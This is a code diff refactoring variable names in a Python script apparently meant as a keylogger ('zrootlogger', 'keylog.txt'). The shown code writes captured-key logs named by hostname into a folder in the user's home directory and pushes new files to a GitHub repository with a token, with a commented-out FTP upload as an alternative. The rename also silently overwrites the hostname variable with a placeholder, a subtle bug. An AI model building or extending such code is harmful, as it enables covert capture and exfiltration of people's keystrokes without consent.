@@ -13,16 +13,16 @@ import keyboard
 
 
 # get the user name as identifier
-userName = str(socket.gethostname())
+user_name = str(socket.gethostname())
 
 
 #For creating app dir
-homePath = os.path.expanduser("~")
-dirName = "zrootlogger"
-dirPath = os.path.join(homePath, dirName)
-if not os.path.exists(dirPath):
-    os.makedirs(dirPath)
-os. chdir(dirPath)
+home_path = os.path.expanduser("~")
+dir_name = "zrootlogger"
+dir_path = os.path.join(home_path, dir_name)
+if not os.path.exists(dir_path):
+    os.makedirs(dir_path)
+os. chdir(dir_path)
 
 
 
@@ -41,10 +41,10 @@ count=0
 
 # # Connect to the FTP server and login
 # ftp = ftplib.FTP("ftp.example.com")
-# ftp.login("username", "password")
+# ftp.login("user_name", "password")
 
 # # Define the source and target paths
-# source_path = dirPath
+# source_path = dir_path
 # target_path = "/remote/folder/path"
 
 # # Sync the local folder with the remote folder using the "copy" option
@@ -59,14 +59,14 @@ import subprocess
 import watchdog.events
 import watchdog.observers
 
-# Define your git username, personal access token, and repository name
-username = "your_username"
+# Define your git user_name, personal access token, and repository name
+user_name = "your_user_name"
 token = "your_token"
 repo_name = "your_repo_name"
 
 # Define your local and remote repository paths
 local_path = "/local/folder/path"
-remote_path = f"https://github.com/{username}/{repo_name}"
+remote_path = f"https://github.com/{user_name}/{repo_name}"
 
 # Define a handler class that inherits from FileSystemEventHandler
 class GitHandler(watchdog.events.FileSystemEventHandler):
@@ -78,8 +78,8 @@ class GitHandler(watchdog.events.FileSystemEventHandler):
         subprocess.run(["git", "add", "."])
         # Commit your changes with a message
         subprocess.run(["git", "commit", "-m", "New file created"])
-        # Push your changes to your remote repository using your username and token
-        subprocess.run(["git", "push", f"https://{username}:{token}@{remote_path}"])
+        # Push your changes to your remote repository using your user_name and token
+        subprocess.run(["git", "push", f"https://{user_name}:{token}@{remote_path}"])
 
 # Create an observer object
 observer = watchdog.observers.Observer()
@@ -119,7 +119,7 @@ class WordCountHandler(logging.FileHandler):
             # get the current date and time as a string
             now = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
             # create a new file with a different name based on the date and time without the prefix
-            self.baseFilename = f"log-"+userName+now+".txt"
+            self.baseFilename = f"log-"+user_name+now+".txt"
             # open the new file in append mode
             self.stream = self._open()
         # call the parent emit method to write the record to the file
@@ -130,7 +130,7 @@ logger = logging.getLogger('my_app')
 # set the logging level to INFO
 logger.setLevel(logging.INFO)
 # create a WordCountHandler object with a word limit of 50 and a filename of 'keylog.txt'
-logHandler = WordCountHandler('log-'+userName+datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')+".txt", word_limit=50)
+logHandler = WordCountHandler('log-'+user_name+datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')+".txt", word_limit=50)
 
 ##for word count interval##
 
@@ -145,7 +145,7 @@ logHandler = WordCountHandler('log-'+userName+datetime.datetime.now().strftime('
 # # create a TimedRotatingFileHandler object
 # logHandler = logging.handlers.TimedRotatingFileHandler('log', when='S', interval=30, backupCount=5)
 # # set the suffix for the rotated file name
-# logHandler.suffix = userName+'-%Y-%m-%d-%H-%M-%S.txt'
+# logHandler.suffix = user_name+'-%Y-%m-%d-%H-%M-%S.txt'
 
 ##for time interval##
 
